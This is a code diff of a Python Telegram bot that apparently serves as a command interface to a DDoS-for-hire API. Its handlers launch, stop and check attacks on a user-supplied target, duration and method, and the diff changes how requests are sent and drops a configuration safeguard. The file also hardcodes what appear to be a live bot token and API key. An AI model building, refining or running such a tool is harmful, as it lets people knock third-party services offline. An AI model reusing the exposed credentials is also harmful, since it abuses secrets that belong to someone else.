@@ -3,7 +3,6 @@ import requests
 import json
 from telegram import Update
 from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters
-
 import os
 import threading
 from http.server import HTTPServer, BaseHTTPRequestHandler
@@ -38,7 +37,6 @@ _health_thread.start()
 BOT_TOKEN = "7814912313:AAHyhW2b17XHgfcyw-26wQSKHZSpCpM9uTs"
 USER_API_KEY = "38698f04-75e1-4bb6-904e-17850e4ca52d"
 
-
 # Base URL for the learning platform API
 API_BASE_URL = "https://vire.cc/api/v1"
 
@@ -51,10 +49,11 @@ logger = logging.getLogger(__name__)
 
 # --- UTILITY FUNCTION FOR API CALLS ---
 
-def call_api(path: str, method: str = 'GET', params: dict = None, json_data: dict = None, requires_auth: bool = True) -> dict:
+def call_api(path: str, method: str = 'GET', params: dict = None, data_payload: dict = None, requires_auth: bool = True) -> dict:
     """
-    Handles API calls, standardizes error checking, and correctly manages
-    API key injection based on the requires_auth flag.
+    Handles API calls, strictly adhering to documented methods and parameter placement.
+    This version uses 'params' for GET requests and 'data' (Form Data) for POST requests
+    to ensure maximum compatibility.
     """
     
     if USER_API_KEY == "YOUR_PERSONAL_API_KEY":
@@ -62,28 +61,32 @@ def call_api(path: str, method: str = 'GET', params: dict = None, json_data: dic
     
     full_url = f"{API_BASE_URL}/{path}"
     
+    # Initialize containers if they are None
     if params is None:
         params = {}
+    if data_payload is None:
+        data_payload = {}
 
+    # 1. AUTHENTICATION LOGIC: Inject API Key based on method
     if requires_auth:
-        # Inject API Key into GET parameters or POST body/data
         if method == 'GET':
+            # Key goes in the URL query string (params) for authenticated GET
             params['user'] = USER_API_KEY
         elif method == 'POST':
-            if json_data is None:
-                json_data = {}
-            json_data['user'] = USER_API_KEY
+            # Key goes in the request body (data) for authenticated POST
+            data_payload['user'] = USER_API_KEY
 
     try:
         if method == 'GET':
+            # Use 'params' for GET requests (adds to URL: ?key=value)
             response = requests.get(full_url, params=params, timeout=10)
         elif method == 'POST':
-            # Use 'json=' for automatic JSON serialisation and Content-Type header
-            response = requests.post(full_url, json=json_data, timeout=10)
+            # Use 'data' for POST requests (Form Data)
+            response = requests.post(full_url, data=data_payload, timeout=10)
         else:
             return {"success": False, "error": "Invalid HTTP Method specified in call_api."}
-
-        # Raise HTTPError if status is 4xx or 5xx
+            
+        # Raise HTTPError if status is 4xx or 5xx (e.g., 400 Bad Request)
         response.raise_for_status() 
         
         data = response.json()
@@ -94,17 +97,16 @@ def call_api(path: str, method: str = 'GET', params: dict = None, json_data: dic
             error_code = data.get('code', 'N/A')
             return {"success": False, "error": f"API Error ({error_code}): {error_message}"}
             
-        # Return success, prioritizing 'data' key if present
         return {"success": True, "data": data.get('data', data)}
         
     except requests.exceptions.HTTPError as e:
-        # Capture the specific HTTP error code and message
-        return {"success": False, "error": f"{e.response.status_code} Client Error: {e.response.reason} for url: {e.request.url}"}
+        # Capture the specific HTTP error code and reason
+        return {"success": False, "error": f"{e.response.status_code} Client Error: {e.response.reason}"}
     except requests.exceptions.RequestException as e:
         logger.error(f"API Request failed for {full_url}: {e}")
         return {"success": False, "error": f"Connection Error: Could not reach the API. Details: `{e}`"}
     except json.JSONDecodeError:
-        return {"success": False, "error": "Invalid API Response: Expected JSON but received malformed data."}
+        return {"success": False, "error": "Invalid API Response: Expected JSON."}
     except Exception as e:
         return {"success": False, "error": f"An unexpected error occurred: {e}"}
 
@@ -148,14 +150,13 @@ async def launch_attack(update: Update, context: ContextTypes.DEFAULT_TYPE) -> N
     target, time_str, method = args
     
     try:
-        # Ensure time is an integer
         time_int = int(time_str)
     except ValueError:
         await update.message.reply_text("🛑 **Invalid Time.** The time parameter must be a whole number in seconds.")
         return
 
     # Prepare data for the POST request
-    payload = {
+    data_payload = {
         "target": target,
         "time": time_int,
         "method": method
@@ -163,8 +164,8 @@ async def launch_attack(update: Update, context: ContextTypes.DEFAULT_TYPE) -> N
 
     await update.message.reply_text(f"🚀 Attempting to launch {method} attack on `{target}` for {time_int} seconds...", parse_mode='Markdown')
     
-    # Send a POST request, which requires authentication
-    response = call_api("start", method='POST', json_data=payload, requires_auth=True)
+    # Authenticated POST request, using 'data_payload' (Form Data)
+    response = call_api("start", method='POST', data_payload=data_payload, requires_auth=True)
 
     if response["success"]:
         message = response['data'].get('message', 'Attack launched successfully! Check status with /status.')
@@ -193,11 +194,10 @@ async def stop_attack(update: Update, context: ContextTypes.DEFAULT_TYPE) -> Non
     
     await update.message.reply_text(f"🛑 Attempting to stop attack(s): `{attack_id}`...", parse_mode='Markdown')
     
-    # Send a GET request, which requires authentication
+    # Authenticated GET request. Parameters are included in the URL via 'params'.
     response = call_api("stop", method='GET', params=params, requires_auth=True)
 
     if response["success"]:
-        # The API documentation implies a message is returned upon success
         message = response['data'].get('message', f'Attack(s) `{attack_id}` stopped.')
         await update.message.reply_text(f"✅ **Stop Success!**\n\n{message}", parse_mode='Markdown')
     else:
@@ -208,7 +208,7 @@ async def get_status(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None
     """Handles the /status command to check attack status."""
     args = context.args
     
-    # Default to 'all' if no argument is provided, to ensure a valid API call.
+    # Default to 'all' if no argument is provided
     attack_id = args[0] if args and len(args) == 1 else 'all'
     
     params = {}
@@ -219,7 +219,7 @@ async def get_status(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None
     
     await update.message.reply_text(f"🔍 Checking status for: `{attack_id}`...", parse_mode='Markdown')
     
-    # Send a GET request, which requires authentication
+    # Authenticated GET request. Parameters are included in the URL via 'params'.
     response = call_api("status", method='GET', params=params, requires_auth=True)
 
     if response["success"]:
@@ -261,13 +261,12 @@ async def list_methods(update: Update, context: ContextTypes.DEFAULT_TYPE) -> No
     
     await update.message.reply_text("🔍 Fetching available methods...", parse_mode='Markdown')
 
-    # Send a GET request, which does NOT require authentication (based on documentation)
-    response = call_api("methods", requires_auth=False)
+    # Unauthenticated GET request. No params, no key sent.
+    response = call_api("methods", method='GET', requires_auth=False)
 
     if response["success"]:
         methods_data = response["data"]
         
-        # Handle case where the list is nested under 'methods' key
         if isinstance(methods_data, dict) and 'methods' in methods_data:
              methods_data = methods_data['methods']
 
@@ -289,7 +288,7 @@ async def get_user_info(update: Update, context: ContextTypes.DEFAULT_TYPE) -> N
     
     await update.message.reply_text("🔍 Fetching user information...", parse_mode='Markdown')
 
-    # Send a GET request, which requires authentication
+    # Authenticated GET request. The key is included in the URL via 'params'.
     response = call_api("user", method='GET', requires_auth=True)
 
     if response["success"]:
@@ -314,8 +313,8 @@ async def get_server_stats(update: Update, context: ContextTypes.DEFAULT_TYPE) -
     
     await update.message.reply_text("🔍 Fetching server statistics...", parse_mode='Markdown')
 
-    # Send a GET request, which does NOT require authentication (based on documentation)
-    response = call_api("stats", requires_auth=False)
+    # Unauthenticated GET request. No params, no key sent.
+    response = call_api("stats", method='GET', requires_auth=False)
 
     if response["success"]:
         stats_data = response["data"]
@@ -325,7 +324,6 @@ async def get_server_stats(update: Update, context: ContextTypes.DEFAULT_TYPE) -
         # Format the dictionary into a readable list
         if isinstance(stats_data, dict):
             for key, value in stats_data.items():
-                # Capitalize keys for better display
                 display_key = key.replace('_', ' ').title()
                 info_text += f"**{display_key}:** `{value}`\n"
         else:
@@ -339,10 +337,7 @@ async def get_server_stats(update: Update, context: ContextTypes.DEFAULT_TYPE) -
 
 def main() -> None:
     """Starts the bot by checking configuration and setting up handlers."""
-    if BOT_TOKEN == "YOUR_TELEGRAM_BOT_TOKEN" or USER_API_KEY == "YOUR_PERSONAL_API_KEY":
-        logger.error("!!! CONFIGURATION ERROR: Please set BOT_TOKEN and USER_API_KEY in the script. !!!")
-        return
-
+    
     # Create the Application and pass it your bot's token.
     application = Application.builder().token(BOT_TOKEN).build()
 
